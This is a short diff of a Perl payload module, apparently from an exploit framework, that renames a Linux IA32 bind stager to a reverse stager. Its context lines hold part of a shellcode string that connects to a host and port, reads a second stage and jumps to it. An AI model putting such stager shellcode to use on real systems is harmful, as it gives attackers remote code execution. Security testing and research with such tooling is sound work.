@@ -1,7 +1,7 @@
 ###############
 ##
 #
-#    Name: BindStager.pm
+#    Name: ReverseStager.pm
 # Version: $Revision$
 #  Source: src/shellcode/linux/ia32/stager_sock_reverse.asm
 # License:
@@ -12,7 +12,7 @@
 #
 # Descrip:
 #
-#      IA32 bind stager for Linux.
+#      IA32 reverse stager for Linux.
 #
 ##
 ###############
@@ -42,7 +42,6 @@ my $info =
 				"\x68\x7f\x00\x00\x01\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58" .
 				"\x50\x51\x57\x89\xe1\x43\xcd\x80\x5b\x99\xb6\x0c\xb0\x03\xcd\x80" .
 				"\xff\xe1"
-
 		}
 };
 
